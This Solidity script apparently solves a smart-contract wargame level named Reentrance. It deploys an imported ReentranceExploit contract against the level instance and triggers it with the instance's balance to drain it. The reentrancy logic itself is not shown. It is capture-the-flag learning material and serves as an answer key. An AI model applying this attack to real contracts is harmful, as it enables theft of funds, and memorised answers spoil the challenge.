// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IReentrance.sol";
import "../src/exploits/ReentranceExploit.sol";

contract SolveLevel10 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC;
        value = 0.001 ether;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IReentrance instance = IReentrance(payable(instanceAddress));
        ReentranceExploit exploit = new ReentranceExploit(instance);

        exploit.exploit{value: instanceAddress.balance}();
    }
}
